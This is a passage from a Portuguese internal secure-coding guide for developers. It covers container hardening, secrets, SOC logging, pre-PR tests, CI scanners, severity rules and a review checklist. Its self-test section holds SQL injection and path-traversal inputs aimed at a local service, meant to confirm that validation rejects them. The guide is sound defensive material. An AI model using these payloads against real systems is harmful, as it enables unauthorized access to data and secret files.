    ports: ["127.0.0.1:8000:8000"]
    mem_limit: 512m
  worker:
    build: ./worker
    networks: [back]      # sem ports: ninguém de fora chega
    secrets: [db_pass]
  db:
    image: mysql:8.4
    networks: [back]
    secrets: [db_pass]
    # sem ports: só api e worker enxergam
secrets:
  db_pass:
    file: ./secrets/db_pass
networks:
  front:
  back:
```

### O que validar na revisão

- Dockerfile tem `USER` não root e `.dockerignore` cobre `.env`, `.git`, chaves e dumps.
- Nenhum `ENV` ou `COPY` com segredo; segredo entra em runtime.
- Compose sem `docker.sock`, sem `privileged`, com rede segmentada e `ports:` só no que é público.
- Imagem base fixada em versão suportada e escaneada no CI.
- Serviço interno Go exige credencial mesmo sem porta publicada.

<h2 id="segredos-configuração-e-dependências">Segredos, configuração e dependências <a href="#por-onde-começar-mapa-por-trecho-de-código" title="Voltar à tabela de navegação">↩</a></h2>

Três problemas que não aparecem no código da feature, mas aparecem em quase todo incidente.

**Segredo no repositório.** Senha de banco, chave de API, token JWT ou chave privada commitados ficam no histórico do git para sempre, mesmo depois de removidos. Regra: segredo só em variável de ambiente ou secret manager; `.env` no `.gitignore`; hook de pre-commit com detecção (gitleaks). Se vazou, o único remédio é rotacionar a credencial.

**Erro verboso em produção.** Stack trace, query SQL, caminho de arquivo e versão de framework na resposta HTTP entregam ao atacante o mapa da aplicação. Regra: `DEBUG=False`, handler global de erro que devolve mensagem genérica e loga o detalhe só no servidor. Vale para Flask, Express, e para o `panic` em Go (usar `recover` no middleware).

**Mensagem de erro que confirma dado.** "Usuário não existe" e "senha incorreta" como respostas diferentes permitem enumerar contas. Mesma resposta e mesmo tempo para os dois casos.

**Dependência vulnerável.** A maior parte do código que roda em produção não foi escrita pelo time. Um pacote npm ou pip com CVE conhecida é explorado sem tocar em uma linha nossa. Regra: lockfile commitado (`package-lock.json`, `requirements.txt` com hash ou `poetry.lock`, `go.sum`); `npm audit`, `pip-audit` e `govulncheck` no CI bloqueando severidade alta; atualização regular, não só quando quebra.

**Senha de usuário.** Nunca em texto puro, nunca MD5 ou SHA-1. Usar bcrypt ou argon2 com a biblioteca da linguagem; nunca implementar hash próprio.

**Log.** Nunca logar senha, token, cookie de sessão, número de cartão ou documento completo. Log com dado sensível vira vazamento quando o log é exportado ou lido por quem não deveria.

<h2 id="o-que-logar-para-o-soc-enxergar-o-ataque">O que logar para o SOC enxergar o ataque <a href="#por-onde-começar-mapa-por-trecho-de-código" title="Voltar à tabela de navegação">↩</a></h2>

Tudo acima reduz a chance de exploração. Nada acima permite descobrir que alguém tentou. Isso é o log. O SOC só detecta o que a aplicação registra, e o `access.log` do proxy não diz quem estava logado nem por que a requisição foi negada.

**No dia a dia do dev:** é o mesmo `logger.info` que você já usa para debugar, só que com campos fixos e nos eventos certos. Custo: uma linha por evento. Ganho: a diferença entre "descobrimos em 10 minutos" e "descobrimos no vazamento".

### Eventos que precisam de log

|Evento|Por que importa|O que registrar além dos campos base|
|---|---|---|
|Login falhou|Brute force e credential stuffing|e-mail tentado (não a senha), motivo (usuário inexistente vs senha errada, só no log)|
|Login ok, troca de senha, troca de e-mail, ativação de MFA|Conta tomada|user_id, IP, User-Agent|
|401 ou 403|Rota sem auth sendo testada, token expirado sendo reutilizado|rota, método, user_id se houver|
|404 em rota de objeto por id (`/invoices/1043`)|Enumeração de IDOR|rota, id tentado, user_id|
|Validação rejeitou (400)|Fuzzing, tentativa de injection|rota, campo rejeitado, motivo (nunca o valor inteiro se for senha ou documento)|
|Path traversal ou upload rejeitado|Tentativa direta|rota, nome de arquivo recebido|
|SSRF bloqueado (IP privado, esquema inválido)|Tentativa direta|host resolvido, IP|
|Comando externo executado|Rastro de RCE|binário e argumentos validados|
|Ação administrativa (criar usuário, mudar role, exportar dado)|Abuso de privilégio|quem, o quê, sobre quem|
|Rate limit atingido|Automação|rota, IP, user_id|

### Campos base em todo evento

```json
{"ts": "2026-09-18T14:03:11Z", "event": "auth.login_failed", "user_id": null, "email": "a@b.com",
 "ip": "203.0.113.7", "ua": "curl/8.4", "route": "POST /api/login", "status": 401,
 "request_id": "c1f9...", "service": "api"}
```

JSON, uma linha por evento, `event` com nome fixo em `dominio.acao` (`auth.login_failed`, `authz.denied`, `input.rejected`, `file.traversal_blocked`, `ssrf.blocked`, `admin.role_changed`). O `request_id` liga o log da API ao do serviço Go e ao do proxy.

**IP real:** atrás de proxy ou load balancer, `request.remote_addr` é o IP do proxy. Usar `X-Forwarded-For` só se o proxy é seu e sobrescreve o header; senão o atacante escolhe o IP que aparece no log.

**O que nunca vai no log:** senha, token, cookie de sessão, número de cartão, documento completo, body inteiro de request. Se precisa de referência, log dos quatro últimos dígitos ou de um hash.

### O que validar na revisão

- Handler de auth, de erro 401/403/404 por id e de validação emite evento nomeado com os campos base.
- Log é JSON estruturado, não string livre.
- `request_id` é gerado na entrada e propagado para chamadas internas.
- Nenhum campo sensível no log.

<h2 id="como-testar-você-mesmo-antes-do-pr">Como testar você mesmo antes do PR <a href="#por-onde-começar-mapa-por-trecho-de-código" title="Voltar à tabela de navegação">↩</a></h2>

O revisor confere o código. Quem confere o comportamento é você, e leva cinco minutos com o serviço rodando local.

### Três curls que pegam a maioria dos problemas

```bash
# 1. Rota sem auth: tem que voltar 401
curl -i http://localhost:8000/api/invoices/1

# 2. IDOR: token do usuário A pedindo objeto do usuário B, tem que voltar 404
curl -i -H "Authorization: Bearer $TOKEN_A" http://localhost:8000/api/invoices/$ID_DO_B

# 3. Injection e traversal: tem que voltar 400, nunca 500
curl -i "http://localhost:8000/api/search?q='%20OR%201=1--"
curl -i "http://localhost:8000/api/download?file=..%2F..%2F.env"
```

500 em qualquer um significa que o dado chegou onde não devia e quebrou algo no caminho. É o sinal de que a validação não existe.

### Teste automatizado: o par 401 e 404

Toda rota nova ganha dois testes. Eles não testam a feature; testam que a porta existe.

Python (pytest):

```python
def test_invoice_requires_auth(client):
    assert client.get("/api/invoices/1").status_code == 401

def test_invoice_hides_other_users(client, token_a, invoice_of_b):
    r = client.get(f"/api/invoices/{invoice_of_b.id}", headers={"Authorization": f"Bearer {token_a}"})
    assert r.status_code == 404
```

TypeScript (Jest + supertest):

```typescript
it("requires auth", async () => {
  await request(app).get("/api/invoices/1").expect(401);
});

it("hides other users' invoices", async () => {
  await request(app)
    .get(`/api/invoices/${invoiceOfB.id}`)
    .set("Authorization", `Bearer ${tokenA}`)
    .expect(404);
});
```

Go (net/http/httptest):

```go
func TestInvoiceRequiresAuth(t *testing.T) {
    rr := httptest.NewRecorder()
    handler.ServeHTTP(rr, httptest.NewRequest("GET", "/api/invoices/1", nil))
    if rr.Code != 401 { t.Fatalf("want 401, got %d", rr.Code) }
}
```

### Ferramentas no CI

O que roda em todo PR, sem depender de alguém lembrar:

|Linguagem|Ferramenta|O que pega|
|---|---|---|
|Python|bandit|`shell=True`, `eval`, hash fraco, `yaml.load`, `DEBUG=True`|
|Python|pip-audit|dependência com CVE|
|TypeScript|eslint-plugin-security|`eval`, regex catastrófica, `child_process` com string|
|TypeScript|npm audit|dependência com CVE|
|Go|gosec|`exec.Command` com concatenação, `text/template`, TLS inseguro, erro ignorado|
|Go|govulncheck|dependência com CVE, só reporta função que o código realmente chama|
|Todas|semgrep (regras `p/owasp-top-ten`)|SQL por string, IDOR por padrão, `dangerouslySetInnerHTML` sem sanitize|
|Repositório|gitleaks|segredo commitado, também no histórico|
|Imagem|trivy|CVE na base e nas libs do sistema, `USER root`, segredo em layer|

Regra de bloqueio: severidade alta ou crítica trava o merge. Média vira comentário no PR. Falso positivo se marca com anotação no código (`# nosec`, `// #nosec`, `// nosemgrep`) e uma linha explicando o porquê, nunca desligando a regra inteira.

### O que validar na revisão

- PR de rota nova inclui os testes 401 e 404.
- Pipeline verde inclui SAST, audit de dependência e scan de imagem.
- Supressão de alerta tem justificativa ao lado.

<h2 id="severidade-o-que-trava-o-deploy-e-o-que-vira-ticket">Severidade: o que trava o deploy e o que vira ticket <a href="#por-onde-começar-mapa-por-trecho-de-código" title="Voltar à tabela de navegação">↩</a></h2>

Nem toda falha tem o mesmo peso. A escala abaixo é a régua para decidir na revisão e para priorizar o que o pentest ou o SOC reportar.

|Severidade|Falhas típicas|O que acontece|
|---|---|---|
|Crítica|SQL Injection, Command Injection, rota administrativa sem auth, segredo de produção no repositório, `docker.sock` montado|Trava o merge. Se já está em produção, corrige hoje, com hotfix fora do ciclo normal|
|Alta|IDOR, Path Traversal, SSRF com acesso a rede interna, upload sem validação, senha em hash fraco|Trava o merge. Em produção, corrige na sprint corrente com prioridade sobre feature|
|Média|XSS, erro verboso, rota comum sem auth em dado não sensível, container root sem outros agravantes, dependência com CVE alta sem exploit conhecido|Merge com ticket aberto e prazo de duas semanas|
|Baixa|Log sem `request_id`, falta de rate limit em rota de leitura, header de segurança ausente|Ticket no backlog, entra no próximo ciclo de melhoria|

**Dois fatores sobem a severidade:** a rota é pública sem login, ou o dado envolvido é pessoal, financeiro ou credencial. Um XSS em painel interno é médio; o mesmo XSS na página de login pública é alto.

**Exceção precisa de justificativa escrita.** Se um ponto do checklist não pode ser atendido (raw SQL por performance, `shell=True` em script legado), o PR descreve o motivo, qual controle compensa (allowlist, isolamento, timeout) e quem aprovou. Sem isso, o revisor reprova.

## Checklist de revisão de código (PR)

Perguntas objetivas para o revisor. Uma resposta "não" trava o merge até corrigir ou justificar no PR.

**Entrada de dados**

- [ ] Todo parâmetro externo tem tipo, formato e tamanho validados (Pydantic, zod, struct com validação)?
- [ ] Nenhuma query SQL montada com string; raw do ORM usa placeholder?
- [ ] Coluna ou tabela escolhida pelo usuário passa por lista fixa?
- [ ] Caminho de arquivo com dado externo passa por resolve e checagem de base?
- [ ] Upload grava com nome gerado, extensão e tipo validados?

**Autenticação e autorização**

- [ ] A rota nova está coberta pelo middleware global de auth, ou está na lista pública com justificativa?
- [ ] Toda query por id filtra por dono ou organização?
- [ ] Id de usuário vem da sessão, nunca do body?
- [ ] Update e delete usam schema de campos permitidos?
- [ ] Tem teste chamando sem token (espera 401) e com token de outro usuário (espera 404)?

**Front**

- [ ] `dangerouslySetInnerHTML` só com sanitização?
- [ ] `href` e `src` com dado externo validados para `http(s)`?
- [ ] Sessão em cookie `HttpOnly`, não em `localStorage`?

**Serviço e container**

- [ ] Dockerfile com `USER` não root e `.dockerignore` cobrindo segredos?
- [ ] Nenhum segredo em `ENV`, `COPY` ou no repositório?
- [ ] `ports:` só nos serviços públicos; rede segmentada; sem `docker.sock` ou `privileged`?
- [ ] Serviço interno exige credencial?

**Comando externo e requisição de saída**

- [ ] Binário externo é chamado com argumentos em lista, sem `shell=True`, `exec()` com string ou `sh -c`?
- [ ] Argumento passa por regex fechada e a chamada tem `timeout`?
- [ ] URL de destino vinda do usuário tem allowlist de host, ou checagem de esquema e IP privado, sem seguir redirect?

**Log e testes**

- [ ] Auth, 401/403, 404 por id e validação rejeitada emitem evento JSON com os campos base?
- [ ] Rota nova tem os testes 401 e 404?
- [ ] Pipeline com SAST, audit de dependência e scan de imagem passou, e toda supressão tem justificativa?

**Geral**

- [ ] Erro em produção devolve mensagem genérica e loga o detalhe só no servidor?
- [ ] Dependência nova sem CVE aberta e lockfile atualizado?
- [ ] Log não grava senha, token, cookie ou documento?

## Próximos temas e referências

**Temas a incluir nas próximas versões, no mesmo formato:** CSRF em rotas que ainda usam cookie sem `SameSite`, rate limiting em login e recuperação de senha, JWT (algoritmo `none`, segredo fraco, sem expiração), deserialização insegura (`pickle`, `yaml.load`), CORS permissivo, e exposição de `.git` e arquivos de backup no servidor web.

**Referências:**

- [OWASP Top 10](https://owasp.org/www-project-top-ten/): as dez categorias de falha mais comuns, base deste guia.
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/): uma página por tema com código de correção por linguagem.
- [OWASP ASVS](https://owasp.org/www-project-application-security-verification-standard/): lista de requisitos verificáveis, útil para transformar este guia em critérios de aceite.
- [Docker security](https://docs.docker.com/engine/security/): documentação oficial sobre isolamento, capabilities e boas práticas de imagem.
- [Go Vulnerability Management](https://go.dev/doc/security/vuln/): `govulncheck` e o banco de vulnerabilidades do Go.

**Manutenção deste documento:** nova falha entra com as quatro partes (o que é, como acontece, código seguro, o que validar) e uma linha nova no checklist. Incidente ou finding de pentest no nosso código vira exemplo aqui, sem dado sensível.

## Governança deste documento

**Dono:** time de segurança (SNOC), com um dev sênior como par de revisão (Guydo). Toda mudança passa pelos dois.

**Revisão:** a cada seis meses, ou antes quando entra linguagem, framework ou infra nova na stack, ou quando um incidente ou finding de pentest mostra algo que o guia não cobria.

**Como uma falha nova entra:** com as mesmas partes das existentes (o que é, no dia a dia do dev, como acontece, código vulnerável, código seguro, o que validar), uma linha na tabela "Por onde começar", um item no checklist e, se couber, um evento na seção de log. Incidente real vira exemplo com o dado sensível removido.

**Como pedir exceção:** descrever no PR o ponto do checklist que não será atendido, o motivo técnico, o controle que compensa e quem aprovou. A exceção fica registrada no PR e vale só para aquele trecho.

**Versão:** o histórico é o do próprio documento. Mudança de conteúdo (falha nova, correção de exemplo) atualiza a data no topo; ajuste de texto não.

## Glossário

| Termo                      | Significado curto                                                                                |
| -------------------------- | ------------------------------------------------------------------------------------------------ |
| Allowlist                  | Lista do que é permitido; tudo fora dela é negado. O oposto de blocklist                         |
| Autenticação               | Provar quem você é (login, token)                                                                |
| Autorização                | Provar que você pode fazer aquilo com aquele objeto                                              |
| CSP                        | Content-Security-Policy, header que diz ao navegador de onde script e recurso podem vir          |
| CVE                        | Identificador público de uma vulnerabilidade conhecida em software (ex.: CVE-2024-3094)          |
| DNS rebinding              | Domínio que resolve para IP público na checagem e para IP interno na requisição                  |
| Hash de senha              | Transformação irreversível da senha para armazenar; bcrypt e argon2 são lentos de propósito      |
| IDOR                       | Acessar objeto de outro usuário trocando o id, por falta de checagem de dono                     |
| Injection de segunda ordem | Dado malicioso gravado hoje e executado quando é lido em outro lugar                             |
| Mass assignment            | Gravar no banco todos os campos do JSON recebido, inclusive os que o usuário não podia alterar   |
| Metadata da nuvem          | Endpoint interno (`169.254.169.254`) que entrega credenciais da instância; alvo clássico de SSRF |
| mTLS                       | TLS onde cliente e servidor apresentam certificado; usado para autenticar serviço com serviço    |
| Placeholder                | O `?` ou `%s` da query parametrizada; marca onde o driver vai inserir o dado                     |
| Rate limit                 | Limite de requisições por IP ou usuário em um período                                            |
| RCE                        | Remote Code Execution, executar código arbitrário no servidor                                    |
| SAST                       | Análise estática do código-fonte em busca de padrões inseguros (bandit, gosec, semgrep)          |
| Sanitizar                  | Remover partes perigosas de um dado; frágil, prefira rejeitar                                    |
| Segredo                    | Senha, chave de API, token, chave privada: qualquer coisa que dá acesso                          |
| SSRF                       | Fazer o servidor requisitar uma URL escolhida pelo atacante                                      |
| XSS                        | Executar script no navegador de outra pessoa via dado que a aplicação renderizou                 |
